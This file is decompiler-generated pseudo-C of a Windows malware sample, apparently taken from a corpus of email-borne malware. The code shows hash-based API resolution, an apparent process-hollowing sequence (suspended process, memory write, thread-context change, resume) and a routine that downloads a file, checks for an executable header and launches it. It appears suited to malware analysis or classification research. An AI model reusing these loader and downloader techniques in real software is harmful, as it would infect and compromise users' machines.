/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_0057/ia32_pe/subject.exe'
 */

/*	Procedure: 0x0040125D - 0x004013AF
 *	Argument size: 0
 *	Local size: 4
 *	Save regs size: 12
 */

L0040125D()
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffffc;



    eax = eax + ecx;
    (save)260;
    (save)4208512;
    (save)0;
    eax = *__imp__GetModuleFileNameA() + ecx;
    (save) *L00403018;
    (save)4208772;
    *L00403164();
    (save) *L0040304C;
    (save)4208772;
    *L00403168();
    (save) *L00403034;
    (save)4208772;
    eax = *L00403168() + ecx;
    (save) *L00403000;
    (save)4208772;
    eax = *L00403168() + ecx;
    (save)4208512;
    (save)4208772;
    *L00403988 = 68;
    *L004039B4 = 1;
    eax = *L00403168() + ecx + ecx;
    *L004039B8 = 2;
    (save)4209100;
    (save)4209032;
    (save)0;
    (save)0;
    (save)4;
    (save)0;
    (save)0;
    (save)0;
    (save)4208772;
    (save)0;
    *L004039dc();
    (save)0;
    eax = *__imp__GetModuleHandleA();
    ebx = eax;
    esi = eax + *(eax + 60);
    (save)64;
    (save)12288;
    (save) *(esi + 80);
    (save)ebx;
    (save) *L004039CC;
    eax = *L004039e0();
    edi = eax;
    eax = eax + ecx;
    (save) & Vfffffffc;
    (save) *(esi + 80);
    (save)ebx;
    (save)edi;
    (save) *L004039CC;
    *L004039E8 = 65543;
    eax = *L004039e4() + ecx + ecx;
    (save)4209128;
    (save) *L004039D0;
    *L00403cb4();
    *L00403AA0 = 0x401000;
    eax = 0x401000 + ecx;
    *L00403cb8();
    return(*L00403cbc( *L004039D0, *L004039D0, 4209128));
}

/*	Procedure: 0x004013B0 - 0x004015E7
 *	Argument size: 0
 *	Local size: 32
 *	Save regs size: 4
 */

__entry_point__()
{
	/* unknown */ void  ebx;
	/* unknown */ void  Vffffffe0;



    (save)4202496;
    eax = *__imp__LoadLibraryW();
    ebx = eax;
    eax = eax + ecx;
    eax = L004015E8(ebx, 1111071457);
    *L004039DC = eax;
    eax = *L004039DC + ecx;
    eax = L004015E8(ebx, -1632130944);
    *L004039E0 = eax;
    eax = *L004039E0 + ecx;
    *L004039E4 = L004015E8(ebx, -1067629373);
    eax = L004015E8(ebx, -1374413863);
    *L00403CB4 = eax;
    eax = *L00403CB4 + ecx;
    *L00403CB8 = L004015E8(ebx, -1374407719);
    eax = L004015E8(ebx, -792678630);
    *L00403CBC = eax;
    eax = *L00403CBC + ecx;
    eax = L004015E8(ebx, 827345528);
    *L00403CC0 = eax;
    eax = *L00403CC0 + ecx;
    eax = L004015E8(ebx, 1053211448);
    *L00403CC4 = eax;
    eax = *L00403CC4 + ecx;
    eax = L004015E8(ebx, 1675923463);
    *L0040316C = eax;
    eax = *L0040316C + ecx;
    eax = L004015E8(ebx, 1945573565);
    *L00403168 = eax;
    eax = *L00403168 + ecx;
    *L00403164 = L004015E8(ebx, 1945329213);
    *L00403CC8 = L004015E8(ebx, 1914049981);
    *L00403174 = L004015E8(ebx, 1663305742);
    *L00403170 = L004015E8(ebx, 551975043);
    *L00403178 = L004015E8(ebx, 715546878);
    *L00403CCC = L004015E8(ebx, -1548852939);
    eax = L004015E8(ebx, -1536590696);
    *L00403CD0 = eax;
    eax = *L00403CD0 + ecx;
    *L00403CD4 = L004015E8(ebx, -647487244);
    (save) *L0040303C;
    (save) & Vffffffe0;
    *L00403164();
    (save) *L0040302C;
    (save) & Vffffffe0;
    eax = *L00403168() + ecx;
    (save) *L00403010;
    (save) & Vffffffe0;
    eax = *L00403168() + ecx;
    (save) *L00403040;
    (save) & Vffffffe0;
    eax = *L00403168() + ecx;
    (save) & Vffffffe0;
    ebx = *L0040316c();
    eax = L004015E8(ebx, -1011431036);
    *L00403CD8 = eax;
    eax = *L00403CD8 + ecx;
    *L00403CDC = L004015E8(ebx, -1403965962);
    *L00403CE0 = L004015E8(ebx, -1133230448);
    *L00403CE4 = L004015E8(ebx, 505991828);
    eax = L004015E8(ebx, 233373895);
    *L00403CE8 = eax;
    eax = *L00403CE8 + ecx;
    (save) *L00403054;
    eax = *L0040316c();
    ebx = eax;
    eax = eax + ecx;
    eax = L004015E8(ebx, -217851720);
    *L00403CEC = eax;
    eax = *L00403CEC + ecx;
    eax = L0040125D() + ecx;
    *L00403cc4(0);
    return(0);
}

/*	Procedure: 0x004015E8 - 0x004016B7
 *	Argument size: 8
 *	Local size: 24
 *	Save regs size: 12
 */

L004015E8(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    esi = Ac;
    eax = eax + ecx + ecx;
    eax = A8;
    edx = *(eax + 60);
    eax = *(edx + eax + 120) + A8;
    Vfffffff0 = eax;
    Vfffffffc = *(Vfffffff0 + 36) + A8;
    if(*__imp__SetFileSecurityA(0, 0, 0) != 0) {
        esi = esi + 349671;
    }
    Vfffffff8 = *(Vfffffff0 + 32) + A8;
    Vfffffff4 = *(Vfffffff0 + 28) + A8;
    edi = 0;
    goto L004016a3;
L00401692:
    eax = *(Vfffffffc + edi * 2) & 65535;
    eax = *(Vfffffff4 + eax * 4);
    eax = eax + A8;
    goto L004016af;
L004016a3:
    while(1) {
        eax = *(Vfffffff0 + 24);
        if(edi >= eax) {
            break;
        }
        eax = eax + ecx;
        Vffffffec = *(Vfffffff8 + edi * 4) + A8;
        Vffffffe8 = 0;
        for(eax = 0; 1; Vffffffe8 = Vffffffe8 + 1) {
            ecx = Vffffffec;
            if(*(Vffffffe8 + ecx) == 0) {
                break;
            }
            edx = eax << 7;
            ecx = eax >> 25;
            eax = edx | ecx;
            eax = eax ^ *(Vffffffe8 + Vffffffec) ^ 244;
        }
        if(eax == esi) {
            goto L00401692;
        }
        edi = edi + 1;
    }
    eax = 0;
L004016af:
}

/*	Procedure: 0x004016B8 - 0x00401898
 *	Argument size: 1028
 *	Local size: 1084
 *	Save regs size: 12
 */

L004016B8(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffbc4;
	/* unknown */ void  Vfffffbc8;
	/* unknown */ void  Vfffffbcc;
	/* unknown */ void  Vfffffbd0;
	/* unknown */ void  Vfffffbd4;
	/* unknown */ void  Vfffffbd5;
	/* unknown */ void  Vffffffd4;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    ebx = A8;
    Vfffffffc = 7;
    (save)0;
    (save) & Vfffffffc;
    esi = 0;
    if(*L00403cd8() != 0) {
        (save)0;
        (save)0;
        (save)0;
        (save)0;
        (save)0;
        Vfffffbcc = *L00403cdc();
        (save)0;
        (save)-2147483648;
        (save)0;
        (save)0;
        (save)ebx;
        (save)Vfffffbcc;
        eax = *L00403ce0();
        edi = eax;
        esi = 0;
        if(edi != 0) {
            eax = eax + ecx;
            (save)ebx;
            eax = *L00403cc8();
            goto L0040173d;
L00401734:
            Vfffffbd0 = eax + ebx + 1;
            goto L00401741;
L0040173d:
            while(eax > 0) {
                if(*(eax + ebx) == 47) {
                    goto L00401734;
                }
                eax = eax - 1;
            }
L00401741:
            (save) *L00403050;
            (save) & Vffffffd4;
            *L00403164();
            (save) *L00403058;
            (save) & Vffffffd4;
            *L00403168();
            (save) *L0040301C;
            (save) & Vffffffd4;
            *L00403168();
            (save)260;
            (save)4208772;
            (save) & Vffffffd4;
            eax = *L00403cc0() + ecx;
            (save) *L00403028;
            (save)4208772;
            eax = *L00403168() + ecx;
            (save)Vfffffbd0;
            (save)4208772;
            *L00403168();
            (save)0;
            (save)0;
            (save)2;
            (save)0;
            (save)0;
            (save)1073741824;
            (save)4208772;
            Vfffffbc4 = *L00403ccc();
            Vfffffbc8 = 0;
            ebx = 0;
            do {
                (save) & Vfffffff8;
                (save)1024;
                (save) & Vfffffbd4;
                (save)edi;
                *L00403ce4();
                if(ebx == 0) {
                    ebx = 1;
                    if(Vfffffbd4 == 77) {
                        ebx = 1;
                        if(Vfffffbd5 == 90) {
                            Vfffffbc8 = 1;
                            ebx = 1;
                        }
                    }
                }
                (save)0;
                (save) & Vfffffff4;
                (save)Vfffffff8;
                (save) & Vfffffbd4;
                (save)Vfffffbc4;
                *L00403cd0();
            } while(Vfffffff8 != 0);
            (save)Vfffffbc4;
            eax = *L00403cd4() + ecx;
            (save)213;
            eax = *L00403174() + ecx;
            esi = 0;
            if(Vfffffbc8 != 0) {
                (save)8;
                (save)0;
                (save)0;
                (save)4208772;
                (save) *L00403008;
                (save)0;
                *L00403cec();
                esi = 1;
            }
        }
        *L00403ce8();
        *L00403ce8(Vfffffbcc, edi);
    }
    return(esi);
}

/*	Procedure: 0x0040189A - 0x00000000
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040189A()
{



}

/* address  size  */
/* 0x004013b0       0 */ /* unknown */ void 	__entry_point__;
/* 0x004030b8       0 */ /* unknown */ void 	__imp__GetCommandLineA;
/* 0x004030bc       0 */ /* unknown */ void 	__imp__ExitProcess;
/* 0x004030c0       0 */ /* unknown */ void 	__imp__GetModuleFileNameA;
/* 0x004030c4       0 */ /* unknown */ void 	__imp__GetModuleHandleA;
/* 0x004030c8       0 */ /* unknown */ void 	__imp__LoadLibraryW;
/* 0x004030d0       0 */ /* unknown */ void 	__imp__SetFileSecurityA;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
